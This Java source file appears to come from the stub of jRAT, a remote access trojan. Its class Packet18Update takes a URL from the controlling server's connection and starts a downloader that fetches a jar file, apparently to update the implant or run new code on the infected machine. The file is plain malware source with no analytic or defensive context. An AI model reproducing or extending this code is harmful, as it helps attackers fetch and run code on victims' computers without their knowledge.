package su.jrat.stub.packets.incoming;

import su.jrat.stub.Connection;
import su.jrat.stub.Downloader;

public class Packet18Update extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String url = Connection.readLine();
		boolean fromLocal = Connection.readBoolean();
		new Downloader(url, true, "jar", fromLocal).start();
	}

}
